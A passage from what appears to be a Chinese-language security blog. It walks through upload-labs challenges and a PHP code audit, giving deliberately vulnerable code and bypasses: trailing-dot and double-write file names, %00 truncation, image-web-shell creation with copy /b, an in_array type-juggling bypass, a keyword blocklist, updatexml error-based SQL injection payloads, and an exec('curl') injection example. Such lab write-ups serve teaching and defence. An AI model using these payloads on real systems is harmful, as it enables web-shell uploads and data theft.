        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p> 这一句代码是用来检测末尾是否是<code>.</code>，可以双写绕过。<br>抓包将文件名改为<code>1.php. .</code> （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了 </p>
<img src="https://i.loli.net/2020/11/30/wldCgUcOSKWPxMu.png" style="zoom:50%;">

<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);

        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>


<p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
<p>这段代码是将文件名中出现  <code>deny_ext</code>的后缀名替换为空</p>
<p>可以双写绕过，即<code>1.pphphp</code></p>
<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);
    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;

        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;
    &#125;
&#125;</code></pre>

<p>本题与之前的题目有所不同，这题的文件的保存路径是可以控制的</p>
<p>这里用的<code>%00截断</code>，原理如下</p>
<p><code>www.xxx.com/qq.jpg</code></p>
<p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php</p>
<img src="https://i.loli.net/2020/11/30/TwSKHkqZFC78uRd.png" style="zoom:50%;">



<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>这题与上题利用的原理相同</p>
<p>但是这里要使用 00的二进制形式</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/13.png" style="zoom:50%;">



<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/13-1.png" style="zoom:50%;">



<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>明确说了上传图片木马</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;
    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);
    <span class="hljs-variable">$bin</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span>
    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);
    <span class="hljs-variable">$strInfo</span> = @<span class="hljs-title function_ invoke__">unpack</span>(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    
    <span class="hljs-variable">$typeCode</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    
    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    
    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      
        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;
            <span class="hljs-keyword">break</span>;        
        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;
        &#125;    
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;
&#125;</code></pre>

<p><strong>GIF89a</strong> 是GIF图片的文件头 ，是为了绕过gif文件的检查</p>
<p><strong>图片木马的制作</strong></p>
<p>桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马</p>
<p><img src="https://i.loli.net/2020/11/30/vXmVIJ3OEzcnrsL.png"></p>
<p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p>
<img src="https://i.loli.net/2020/11/30/KWgpdyf8xoFqcMn.png" style="zoom:50%;">



<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="1-in-array"><a href="#1-in-array" class="headerlink" title="1.in_array"></a>1.in_array</h2><pre><code class="hljs php"><span class="hljs-comment">//1.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;
<span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span>);
&#125;

<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users&quot;</span>;
<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;
    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();
    <span class="hljs-variable">$whitelist</span> = <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">1</span>, <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;COUNT(*)&#x27;</span>]);
&#125;

<span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">stop_hack</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);
<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span>&quot;</span>;

<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;id <span class="hljs-subst">$id</span> is not in whitelist.&quot;</span>);
&#125;

<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;
    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;
    &#125;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$conn</span>-&gt;error);
&#125;

<span class="hljs-meta">?&gt;</span>
</code></pre>



<p><strong>漏洞解析</strong> ：</p>
<p>这一关卡考察的是一个任意文件上传漏洞，而导致这一漏洞的发生则是不安全的使用 <strong>in_array()</strong> 函数来检测上传的文件名，即上图中的第12行部分。由于该函数并未将第三个参数设置为 <strong>true</strong> ，这导致攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 <strong>7shell.php</strong> 。因为PHP在使用 <strong>in_array()</strong> 函数判断时，会将 <strong>7shell.php</strong> 强制转换成数字7，而数字7在 <strong>range(1,24)</strong> 数组中，最终绕过 <strong>in_array()</strong> 函数判断，导致任意文件上传漏洞。</p>
<p><strong style="color:orange;">in_array()</strong></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320210651995.png" alt="image-20210320210651995" style="zoom: 67%;">

<p>漏洞利用的例题如下</p>
<pre><code class="hljs php"><span class="hljs-comment">//index.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;
<span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span>);
&#125;

<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users&quot;</span>;
<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;
    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();
    <span class="hljs-variable">$whitelist</span> = <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">1</span>, <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;COUNT(*)&#x27;</span>]);
&#125;
<span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">stop_hack</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);
<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span>&quot;</span>;
<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;id <span class="hljs-subst">$id</span> is not in whitelist.&quot;</span>);
&#125;
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;
    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;
    &#125;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$conn</span>-&gt;error);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>



<pre><code class="hljs php"><span class="hljs-comment">//config.php</span>
<span class="hljs-meta">&lt;?php</span>  
<span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;
<span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;fire&quot;</span>;
<span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;fire&quot;</span>;
<span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;day1&quot;</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stop_hack</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;
    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;
    <span class="hljs-variable">$back_list</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$pattern</span>);
    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$back_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$hack</span>)&#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$hack</span>/i&quot;</span>, <span class="hljs-variable">$value</span>))
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$hack</span> detected!&quot;</span>);
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>可以看到网页的功能很简单，就是输入用户id，然后服务器返回用户的信息，但是对id参数使用in_array()函数进行了检查，但是我们可以利用上面提到的漏洞，只要payload的第一个字符在range(1,count(*))的范围之内即可绕过第检查。绕过效果如下</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320214443192.png" alt="image-20210320214443192" style="zoom:67%;">

<p>但是有一个stop_hack函数，其过滤了很多sql注入中常用的关键词，导致了很多方法无法使用，其中or被过滤就很麻烦，information_schema中包含or单词，所以常规的注入方法无法使用。</p>
<p>这里可以使用报错注入，使用 make_set()函数实现报错注入。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320215543202.png" alt="image-20210320215543202" style="zoom:67%;">

<pre><code class="hljs reasonml">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,make<span class="hljs-constructor">_set(7,0x7e,(<span class="hljs-params">select</span> <span class="hljs-params">user</span>()</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)</code></pre>

<p>表名，列名无法使用information_shcema，但是如果是为了获取flag的话，可以猜测是在flag表的flag列</p>
<p>最后获取flag的payload</p>
<pre><code class="hljs reasonml">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,make<span class="hljs-constructor">_set(7,0x7e,(<span class="hljs-params">select</span> <span class="hljs-params">flag</span> <span class="hljs-params">from</span> <span class="hljs-params">flag</span>)</span>,<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320220057808.png" alt="image-20210320220057808" style="zoom:50%;">





<h2 id="2-filter-var函数缺陷"><a href="#2-filter-var函数缺陷" class="headerlink" title="2.filter_var函数缺陷"></a>2.filter_var函数缺陷</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>) &amp;&amp; <span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$url</span>, FILTER_VALIDATE_URL))&#123;
    <span class="hljs-variable">$site_info</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sec-redclub.com$/&#x27;</span>,<span class="hljs-variable">$site_info</span>[<span class="hljs-string">&#x27;host&#x27;</span>]))&#123;
        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;curl &quot;&#x27;</span>.<span class="hljs-variable">$site_info</span>[<span class="hljs-string">&#x27;host&#x27;</span>].<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-variable">$result</span>);
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="hljs-subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span>
<span class="hljs-string">              &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$result</span>);
    &#125;
    <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);
    &#125;

&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span>
<span class="hljs-string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;
&#125;

<span class="hljs-meta">?&gt;</span>
</code></pre>



<p><strong style="color:orange;">filter_var</strong></p>
